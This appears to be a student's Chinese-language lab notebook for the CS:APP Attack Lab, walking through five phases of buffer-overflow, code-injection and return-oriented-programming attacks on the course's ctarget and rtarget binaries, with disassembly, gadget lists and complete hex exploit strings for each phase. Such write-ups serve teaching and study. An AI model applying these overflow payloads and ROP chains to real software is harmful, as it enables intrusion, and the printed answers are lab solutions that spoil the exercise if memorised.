# 第三周lab实验笔记
本次实验共五个任务，前三个在ctaget上，4和5在rtarget上。 
一开始看这个实验一脸懵逼，看的官网的writewp大体明白了这个实验是个啥子意思

## phase_1
根据writewp上的源码，我们需要通过栈溢出控制程序流程跳转至touch1函数
test函数源码
```
1 void test()
2 {
3 int val;
4 val = getbuf();
5 printf("No exploit. Getbuf returned 0x%x\n", val);
6 }
```
test函数中调用了getbuf函数，查看其反汇编代码
```
pwndbg> disassemble getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    rsp,0x28
   0x00000000004017ac <+4>:	mov    rdi,rsp
   0x00000000004017af <+7>:	call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    eax,0x1
   0x00000000004017b9 <+17>:	add    rsp,0x28
   0x00000000004017bd <+21>:	ret    
```
可以看到只需要溢出0x28的数据即可覆盖rip控制程序流程
查看touch1的地址
```
pwndbg> p touch1
$1 = {void ()} 0x4017c0 <touch1>
```
然后就是这次实验给出的工具hex2raw，我们需要通过这个工具生成字符串完成实验
创建attach.txt并在其中存入如下内容
```
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61 c0 17 40
```
前面这些a的十六进制表示我是拿010生成的，后面再手动补上小端存储的touch1地址
然后执行程序完成本次实验
![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image1.png)

## phase_2
touch2源代码
```
1 void touch2(unsigned val)
2 {
3 vlevel = 2; /* Part of validation protocol */
4 if (val == cookie) {
5 printf("Touch2!: You called touch2(0x%.8x)\n", val);
6 validate(2);
7 } else {
8 printf("Misfire: You called touch2(0x%.8x)\n", val);
9 fail(2);
10 }
11 exit(0);
12 }
```
程序要求我们令val的值等于我们的cookie值才能通过，而val则是作为函数的第一个参数传入，也就是说只要让rdi寄存器的值等于cookie就可以了
使用ROPgadget找到如下gadget
```
0x000000000040141b : pop rdi ; ret
```
然后构造ROP链如下所示
```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 1b 14 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00 ec 17 40 00 00 00 00 00
```
完成phase_2
![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image2.png)

嗯，做到后面猛然发现，前三题是要用code-injection做的，重来重来
思路还是一样的可以通过构造如下方式完成等同于ROP链的效果
```
mov    $0x59b997fa, %rdi
push   $0x4017ec
ret
```
然后还需要将rsp寄存器的地址作为第一次返回地址
![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image5.png)
这样就可以完成本题了
```
48 c7 c7 fa 97 b9 59 	
68 ec 17 40 00       	
c3 
00 00 00 00 00 00 00
00 00 00 00 00 00 00
00 00 00 00 00 00 00
00 00 00 00 00 00
78 dc 61 55
```
![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image6.png)

## phase_3
touch3的源码
```
1 /* Compare string to hex represention of unsigned value */
2 int hexmatch(unsigned val, char *sval)
3 {
4 char cbuf[110];
5 /* Make position of check string unpredictable */
6 char *s = cbuf + random() % 100;
7 sprintf(s, "%.8x", val);
8 return strncmp(sval, s, 9) == 0;
9 }
10
11 void touch3(char *sval)
12 {
13 vlevel = 3; /* Part of validation protocol */
14 if (hexmatch(cookie, sval)) {
15 printf("Touch3!: You called touch3(\"%s\")\n", sval);
16 validate(3);
17 } else {
18 printf("Misfire: You called touch3(\"%s\")\n", sval);
19 fail(3);
20 }
21 exit(0);
22 }
```
发现其调用了hexmathch函数，并将cookie和sval作为指针传入其中。
hexmatch函数会将我们的cookie值以字符串形式输出，然后与rdi中的值进行比对，相同则通过程序。
```
mov    $0x5561dca8, %rdi
push   $0x4018fa
ret
```
使用caller的栈顶地址作为存放字符串的地址，然后将其赋值给rdi，这样就可以避免其被覆盖
可以通过gdb调试找到caller的栈顶地址
![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image8.png)
转换后
```
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```
![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image7.png)

## phase_4
跟phase_2一样的题目，但是需要通过ROP完成攻击。
然后构造ROP链如下所示
```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 1b 14 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00 ec 17 40 00 00 00 00 00
```
![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image9.png)

##phase_5
同phase_3的题目一样的要求，不过这次栈地址随机化弄得很难受
不过用ROPgadget看了一下有惊喜
```
0x0000000000401383 : pop rsi ; ret
0x0000000000401a06 : mov rax, rsp ; ret
0x00000000004019a2 : mov rdi, rax ; ret
0x00000000004019d6 : lea rax, [rdi + rsi] ; ret
```
可以用这几个gadget构造ROP链
```
pop rsi ; ret
0x20
mov rax, rsp ; ret
mov rdi, rax ; ret
lea rax, [rdi + rsi] ; ret
mov rdi, rax ; ret
touch3_addr
cookie_string
```
转换成16进制小端存储
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
83 13 40 00 00 00 00 00
20 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```
完成本题

![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image10.png)



